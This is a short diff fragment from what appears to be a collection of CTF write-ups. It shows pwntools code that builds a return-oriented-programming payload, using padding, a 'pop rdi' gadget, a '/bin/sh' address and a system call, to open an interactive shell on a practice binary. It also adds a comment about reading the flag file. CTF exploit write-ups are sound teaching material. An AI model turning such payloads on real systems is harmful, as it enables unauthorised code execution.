@@ -709,6 +709,7 @@ icon: icon-html
   payload = 'a'*(0x10+0x8)+p64(pop_rdi_ret)+p64(binsh)+p64(call_system)
   r.sendline(payload)
   r.interactive()
+  #cat /home/babyrop/flag
   ```
 
 * ### [HarekazeCTF2019]baby_rop2
